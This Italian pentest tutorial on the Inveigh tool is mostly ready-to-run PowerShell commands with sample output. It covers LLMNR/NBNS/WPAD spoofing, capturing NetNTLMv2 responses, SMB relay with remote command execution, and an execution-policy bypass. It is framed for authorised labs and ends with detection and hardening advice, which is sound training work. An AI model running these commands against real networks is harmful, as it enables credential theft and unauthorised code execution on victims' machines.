---
title: 'Inveigh: LLMNR, NBNS e WPAD per Catturare Hash NTLM'
slug: inveigh
description: 'Cos''è Inveigh e come funziona? Guida a LLMNR, NBNS e WPAD per catturare NetNTLM in lab Windows, con PowerShell, relay, troubleshooting e detection.'
image: /INVEIGH.webp
draft: false
date: 2026-01-22T00:00:00.000Z
lastmod: 2026-09-14T00:00:00.000Z
categories:
  - tools
subcategories:
  - recon
tags:
  - inveigh
  - ''
---

# Inveigh: LLMNR, NBNS e WPAD per Catturare NetNTLM

Inveigh è uno strumento machine-in-the-middle pensato per pentester che si trovano già su un host Windows (post-exploitation) e vogliono sfruttare il traffico di name resolution locale — LLMNR, NBNS, WPAD — per indurre autenticazioni NTLM verso di sé e catturarle.

Il progetto esiste in due rami: la versione **PowerShell (1.506)**, oggi considerata legacy e non più aggiornata, e la versione **C#/.NET (InveighZero)**, che è il ramo principale attuale e copre più protocolli e listener. Gli esempi di questa guida usano la sintassi PowerShell, la più diffusa nei walkthrough, ma verifica sempre quale versione hai a disposizione nel tuo lab prima di affidarti a un parametro specifico.

Tutto quello che segue va usato solo su lab, CTF, HTB/PG o ambienti per cui hai autorizzazione esplicita: anche solo "ascoltare" e rispondere su questi protocolli può avere effetti su utenti e servizi reali.

## Cos'è Inveigh e come funziona

Inveigh intercetta richieste LLMNR/NBNS (e spesso WPAD) e vi risponde fingendosi la risorsa cercata, inducendo il client a tentare un'autenticazione NTLM verso il tuo host — autenticazione che puoi catturare e, in alcuni casi, tentare di rilanciare (relay) su un altro sistema. È l'equivalente "Windows-side" di [Responder](https://hackita.it/articoli/responder/), utile quando sei già dentro una rete via un foothold Windows e non vuoi (o non puoi) spostarti su Kali.

Quello che ottieni tipicamente non è un "hash NTLM" in senso stretto, ma un **NetNTLM challenge/response**: una struttura che lega uno username, un dominio e una risposta crittografica legata alla sfida inviata dal server — craccabile offline con la stessa logica di un hash, ma tecnicamente un oggetto diverso.

Segnali che in un lab vale la pena provarci: richieste LLMNR (UDP 5355) o NBNS (UDP 137) frequenti, tentativi automatici di risoluzione di `WPAD`, autenticazioni NTLM dove ti aspetteresti Kerberos.

## Installazione e prerequisiti

### Versione PowerShell (legacy, comoda in post-exploitation)

```powershell
Import-Module .\Inveigh.psd1
Get-Command -Module Inveigh
```

```text
CommandType Name              Version Source
----------- ----              ------- ------
Function    Invoke-Inveigh     1.506   Inveigh
Function    Stop-Inveigh       1.506   Inveigh
Function    Get-InveighNTLM    1.506   Inveigh
```

Se vedi questi comandi esportati, il modulo è caricato correttamente. Se PowerShell si rifiuta di eseguire lo script:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

Da usare solo nel contesto del lab — non come impostazione permanente.

### Versione C#/.NET (InveighZero, ramo principale)

```powershell
dotnet .\Inveigh.dll
```

```text
Inveigh ...
C(0:0) NTLMv1(0:0) NTLMv2(0:0)>
```

Il prompt con i contatori (cleartext:NTLMv1:NTLMv2) conferma che il runtime è partito. Se `dotnet` non è disponibile sul target, in lab porta un binario self-contained già compilato.

Nota: alcune funzionalità, in particolare il packet sniffing "raw", richiedono privilegi elevati. Senza elevazione, preferisci i listener disponibili o la modalità inspect per osservare senza spoofare.

## Inveigh Commands: i parametri principali

| Parametro           | Funzione                                                              |
| ------------------- | --------------------------------------------------------------------- |
| `-Inspect`          | Osserva richieste LLMNR/NBNS senza attivare spoofing                  |
| `-ConsoleOutput`    | Abilita output a console                                              |
| `-FileOutput`       | Salva l'output su file                                                |
| `-OutputDir`        | Directory di output                                                   |
| `-NBNS`             | Abilita/disabilita lo spoofing NBNS                                   |
| `-WPADAuth`         | Configura il tipo di autenticazione richiesta su WPAD                 |
| `-SpooferRepeat`    | Abilita/disabilita la ripetizione delle risposte di spoofing          |
| `-OutputStreamOnly` | Forza l'output sullo stream standard, utile su shell remote instabili |

## Inspect mode: osservare prima di agire

Prima di attivare qualunque spoofing, conviene sempre capire se il lab genera davvero traffico LLMNR/NBNS/WPAD:

```powershell
Invoke-Inveigh -Inspect -ConsoleOutput Y
```

```text
[LLMNR] Request for FILESRV01 from 10.10.10.23
[NBNS]  Query for WPAD from 10.10.10.45
```

Richieste ricorrenti per nomi non risolti indicano che una sessione di capture ha senso. È solo osservazione, non cattura: quando confermi il pattern, riavvia senza `-Inspect`.

Se non vedi nulla dopo un paio di minuti, il problema è quasi sempre l'assenza di traffico reale nel lab (o la subnet sbagliata), non uno strumento "rotto" — puoi validare lato rete anche con [TShark](https://hackita.it/articoli/tshark/) da una macchina Linux di supporto, se disponibile.

## LLMNR e NBNS: cattura di base

### Avvio "default capture" (rapido, ma più rumoroso)

Parte subito a catturare su HTTP/SMB e spoofare LLMNR (NBNS escluso di default in questo esempio, per ridurre il raggio d'azione):

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp
```

```text
[*] Inveigh started
[*] LLMNR Spoofer [ON]
[*] NBNS Spoofer [OFF]
[*] HTTP Capture [ON]
[*] SMB Capture [ON]
```

Se dopo qualche minuto non hai catture, verifica che nel lab esistano davvero richieste LLMNR/NBNS e che il firewall locale non blocchi il traffico in ingresso su porta/servizio.

### Stealth mirato (riduci il rumore generato)

Utile quando vuoi meno eventi ma più puliti e correlabili, invece di partire con tutto acceso:

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -SpooferRepeat N -WPADAuth Anonymous -NBNS N
```

```text
[*] SpooferRepeat [OFF]
[*] WPADAuth [Anonymous]
[*] NBNS Spoofer [OFF]
```

`-SpooferRepeat N` riduce le risposte ripetute verso lo stesso host — non è una vera protezione contro l'account lockout, che dipende da policy di dominio e comportamento del client, non dalla frequenza dello spoofing. `WPADAuth Anonymous` può ridurre prompt fastidiosi lato client, ma il comportamento varia da ambiente ad ambiente: se non vedi nulla, prova a tornare su `WPADAuth NTLM` e confronta i risultati.

## WPAD e cattura NetNTLM

WPAD (Web Proxy Auto-Discovery) può generare tentativi di autenticazione NTLM in certi ambienti — non come regola universale, dipende da configurazione di client e rete:

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -WPADAuth NTLM
```

```text
[HTTP] WPAD request from 10.10.10.45 for /wpad.dat
[HTTP] NTLMv2 captured for CORP\svc_proxy
```

Se non vedi richieste WPAD, in molti ambienti moderni è semplicemente disabilitato: non forzarlo, torna su LLMNR/NBNS e valida con `-Inspect`.

Se abiliti HTTPS nella versione PowerShell, verrà installato un certificato nel certificate store locale: pianifica sempre il cleanup a fine test.

## Analizzare i NetNTLM catturati

```powershell
Get-InveighNTLM
```

```text
CORP\mrossi::CORP:1122334455667788:2F0A5BD1E1F0...:0101000000000000...
CORP\SRV01$::CORP:9A8B7C6D5E4F3210:AA11BB22CC33...:0101000000000000...
```

Il formato `utente::dominio:challenge:response:blob` è tipico di NetNTLMv2; gli account macchina terminano con `$` e spesso dominano l'output, dato che molti servizi Windows autenticano in automatico.

## NTLM Relay: prerequisiti e validazione in lab

Il supporto al relay è una funzionalità della versione PowerShell/legacy, distinta dal ramo C#/.NET. Funziona solo se il target non richiede SMB signing e se l'account catturato ha privilegi sufficienti sul target — in lab lo scopo è dimostrare l'impatto (o l'efficacia delle mitigazioni), non generare rumore.

Prima di qualunque relay, vale la pena mappare la superficie AD con [BloodHound](https://hackita.it/articoli/bloodhound/) per capire quali account e percorsi hanno davvero senso da testare.

```powershell
. .\Inveigh-Relay.ps1
Invoke-Inveigh -SMBRelay Y -SMBRelayTarget 10.10.10.20 -SMBRelayCommand "whoami"
```

```text
[*] SMBRelay [ON] Target [10.10.10.20]
[*] Relay attempt for CORP\mrossi
[+] Relay success, command executed
```

Se il relay fallisce sempre, le cause più comuni sono SMB signing attivo, target non raggiungibile o privilegi insufficienti — in quel caso il test ha comunque dimostrato che le mitigazioni funzionano, che è un risultato valido da riportare.

## Inveigh vs Responder

|                                 | Inveigh                       | Responder              |
| ------------------------------- | ----------------------------- | ---------------------- |
| Piattaforma                     | Windows (PowerShell o .NET)   | Linux                  |
| LLMNR                           | Sì                            | Sì                     |
| NBNS                            | Sì                            | Sì                     |
| WPAD                            | Sì                            | Sì                     |
| Eseguibile da PowerShell nativo | Sì                            | No                     |
| Scenario tipico                 | Foothold Windows già ottenuto | Postazione Kali in LAN |

Se sei già su un host Windows compromesso e non vuoi introdurre un secondo salto verso Kali, Inveigh è la scelta naturale; se lavori da una macchina Linux con buona posizione di rete, Responder resta il workflow più diretto.

## Troubleshooting

**Nessun evento catturato.** Verifica prima con `-Inspect -RunTime 2` se nel lab passa davvero traffico LLMNR/NBNS/WPAD — senza richieste reali, nessuno strumento produrrà risultati.

**Console che sembra bloccata o output non visibile in shell remota.** Alcune sessioni remote gestiscono male stream diversi; forza l'output standard:

```powershell
Invoke-Inveigh -ConsoleOutput Y -OutputStreamOnly Y
```

Se hai comunque abilitato `-FileOutput Y`, controlla il file nella `-OutputDir` indicata.

**Porte o servizi in conflitto.** Verifica cosa sta già ascoltando prima di dare per scontato che Inveigh non funzioni:

```powershell
netstat -ano | findstr ":80"
netstat -ano | findstr ":445"
```

Un PID `4` (System) su quelle porte indica servizi Windows nativi già in ascolto — a seconda della versione e modalità, Inveigh può comunque catturare senza dover "rubare" la porta.

## Detection e hardening

**Detection:**

* Picchi di traffico LLMNR (UDP 5355) o NBNS (UDP 137) con risposte provenienti da host non attesi
* Richieste ripetute verso `wpad.dat` indirizzate a un host comparso di recente sulla rete
* Correlazione tra il nome richiesto (es. `FILESRV01`) e una risposta arrivata da una workstation qualunque
* Hunting su PowerShell per stringhe/comandi tipici di tool MITM — con attenzione ai falsi positivi in lab

**Hardening:**

* Disabilitare LLMNR via GPO dove possibile
* Limitare o filtrare NBNS (UDP 137)
* Disabilitare WPAD se non è in uso, o controllarne rigorosamente la risoluzione
* Enforcement di SMB signing, per rendere inefficace il relay anche se una cattura riesce
* Ridurre la dipendenza da NTLM dove possibile, a favore di Kerberos

Prima di arrivare al relay, un giro di enumerazione con [smbclient](https://hackita.it/articoli/smbclient/) o [Enum4linux-ng](https://hackita.it/articoli/enum4linux-ng/) aiuta a capire cosa vale davvero la pena testare.

## Scenario pratico su una macchina HTB/PG

Ambiente: foothold Windows su `10.10.10.10`, subnet lab `10.10.10.0/24`. Obiettivo: catturare almeno un NetNTLMv2 e documentare detection/hardening.

```powershell
Import-Module .\Inveigh.psd1
Invoke-Inveigh -Inspect -ConsoleOutput Y -RunTime 2
```

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp -SpooferRepeat N -NBNS N
```

```powershell
Get-InveighNTLM
```

Risultato atteso: almeno una riga NetNTLMv2 (utente o account macchina) e, se `-FileOutput Y` è attivo, un log salvato in `C:\Windows\Temp`. Nel report vale la pena includere sempre: sorgente della richiesta, nome richiesto, tipo di risposta rogue, account catturato, e le mitigazioni verificate (o mancanti) — disabilitazione LLMNR/NBNS/WPAD, stato di SMB signing.

## Playbook 10 minuti: Inveigh in un lab

### Step 1 – Conferma che il lab genera LLMNR/NBNS/WPAD

Avvia `-Inspect` per 2 minuti: se non vedi richieste, cambiare strumento non aiuta.

```powershell
Invoke-Inveigh -Inspect -ConsoleOutput Y -RunTime 2
```

### Step 2 – Carica il modulo e prepara la directory di output

Usa una cartella scrivibile e non insolita, per evitare errori di permessi.

```powershell
Import-Module .\Inveigh.psd1
New-Item -ItemType Directory -Path C:\Windows\Temp\inv -Force | Out-Null
```

### Step 3 – Avvia la cattura con rumore ridotto

Disabilita repeat e NBNS finché non hai un motivo specifico per riattivarli.

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp\inv -SpooferRepeat N -NBNS N
```

### Step 4 – Osserva per 3-5 minuti e annota le sorgenti più "chiacchierone"

Gli host che generano richieste ripetute sono spesso i migliori candidati per un test controllato successivo.

### Step 5 – Estrai i NetNTLM catturati e salva le evidenze

Lo scopo è essere reportabile: cattura più contesto più mitigazioni verificate.

```powershell
Get-InveighNTLM | Out-File C:\Windows\Temp\inv\netntlm.txt -Encoding ascii
```

### Step 6 – Se serve, abilita WPAD in modo misurato

Non partire da WPAD se `-Inspect` non ha mostrato richieste: abilitalo solo per validare quel vettore specifico.

```powershell
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp\inv -WPADAuth NTLM
```

### Step 7 – Stop pulito

Fermati e lascia il sistema in condizioni pulite, per non inquinare i test successivi.

```powershell
Stop-Inveigh
```

## Riassunto 80/20

| Obiettivo                   | Azione pratica                       | Comando/Strumento                               |
| --------------------------- | ------------------------------------ | ----------------------------------------------- |
| Capire se vale la pena      | Osserva richieste di name resolution | `Invoke-Inveigh -Inspect`                       |
| Avviare la cattura          | Console + file output                | `Invoke-Inveigh -ConsoleOutput Y -FileOutput Y` |
| Ridurre il rumore           | Disabilita repeat e NBNS             | `-SpooferRepeat N` + `-NBNS N`                  |
| Estrarre gli hash catturati | Leggi i NetNTLM in memoria           | `Get-InveighNTLM`                               |
| Gestire una shell fragile   | Forza lo standard output             | `-OutputStreamOnly Y`                           |
| Chiudere in modo pulito     | Stop e cleanup                       | `Stop-Inveigh`                                  |

## Concetti controintuitivi

**"Se non catturo nulla, è colpa del tool."** Quasi sempre è il lab: senza richieste LLMNR/NBNS/WPAD reali non hai nessun trigger. Prima `-Inspect`, poi decidi.

**"Più spoofing produce più risultati."** Più spoofing significa soprattutto più rumore e più rischio di essere notato. In lab conviene partire minimal (`NBNS` off, `SpooferRepeat` off) e scalare solo se serve.

**"WPAD è sempre la scorciatoia più facile."** In molti ambienti moderni è disabilitato o gestito rigorosamente. Se `-Inspect` non mostra richieste WPAD, non insistere: lavora su LLMNR/NBNS.

**"Il relay è la parte che conta davvero."** In parecchi lab aggiornati il relay fallisce per SMB signing o policy — ed è comunque un risultato utile: dimostra che una mitigazione funziona, non solo che un attacco riesce.

**"Abilitare HTTPS rende tutto più credibile."** Introduce anche un certificato installato localmente e complica il cleanup. Usalo solo quando stai testando specificamente quel vettore.

## Inveigh Cheat Sheet

```powershell
Import-Module .\Inveigh.psd1
Invoke-Inveigh -Inspect -ConsoleOutput Y -RunTime 2
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -OutputDir C:\Windows\Temp -SpooferRepeat N -NBNS N
Get-InveighNTLM
Invoke-Inveigh -ConsoleOutput Y -FileOutput Y -WPADAuth NTLM
Stop-Inveigh
```

## Checklist operativa

* Conferma che il test sia autorizzato e il perimetro chiaro
* Osserva sempre prima con `-Inspect`, poi decidi se attivare spoofing/capture
* Usa `-SpooferRepeat N` per ridurre il rumore generato
* Tieni `-NBNS N` finché non hai un motivo specifico per abilitarlo
* Verifica che `-OutputDir` sia scrivibile prima di lanciare una sessione lunga
* Se catturi zero eventi, verifica traffico reale prima di sospettare un bug
* Se testi il relay, fallo solo su target di lab e documenta anche i fallimenti
* Chiudi sempre con `Stop-Inveigh` e rimuovi eventuali certificati/log residui

## FAQ

**Cos'è Inveigh?**
Uno strumento machine-in-the-middle per pentester su Windows, che sfrutta LLMNR/NBNS/WPAD per indurre e catturare autenticazioni NTLM.

**Qual è la differenza tra la versione PowerShell e quella .NET?**
La versione PowerShell (1.506) è legacy e non più aggiornata; la versione C#/.NET (InveighZero) è oggi il ramo principale del progetto e copre più protocolli.

**Inveigh cattura hash NTLM o NetNTLM?**
Cattura NetNTLM challenge/response, non un hash NTLM nel senso stretto — craccabile offline con logica simile, ma tecnicamente un oggetto diverso.

**Perché Inveigh non cattura nulla nel mio lab?**
Quasi sempre perché non c'è traffico LLMNR/NBNS/WPAD reale nella subnet. Verifica prima con `-Inspect`.

**Inveigh richiede privilegi elevati?**
Alcune funzionalità sì, in particolare il packet sniffing raw. Senza elevazione, i listener disponibili o la modalità inspect restano utilizzabili.

**Il relay NTLM funziona sempre?**
No: richiede che il target non imponga SMB signing e che l'account catturato abbia privilegi sufficienti. Un fallimento spesso significa che le mitigazioni funzionano.

**Meglio Inveigh o Responder?**
Dipende dalla posizione: Inveigh è comodo se sei già su un foothold Windows, Responder è il workflow più diretto da una postazione Linux in LAN.

## Link utili su HackIta

Per il confronto diretto con lo strumento equivalente da Linux vedi [Responder](https://hackita.it/articoli/responder/); per validare il traffico di rete anche visivamente, [Wireshark](https://hackita.it/articoli/wireshark/) o [TShark](https://hackita.it/articoli/tshark/) da terminale; per l'enumerazione SMB/AD prima di un relay, [smbclient](https://hackita.it/articoli/smbclient/), [Enum4linux-ng](https://hackita.it/articoli/enum4linux-ng/) e [CrackMapExec](https://hackita.it/articoli/crackmapexec/); per capire dove porta un account catturato, [BloodHound](https://hackita.it/articoli/bloodhound/).

## Riferimenti ufficiali

* [Inveigh – Repository ufficiale](https://github.com/Kevin-Robertson/Inveigh)
* [MITRE ATT\&CK – T1557.001: LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/)
* [Infinite Logins – Capturing & Relaying Net-NTLM Hashes Using Inveigh](https://infinitelogins.com/2020/11/16/capturing-relaying-net-ntlm-hashes-without-kali-linux-using-inveigh/): walkthrough indipendente con parametri e note pratiche
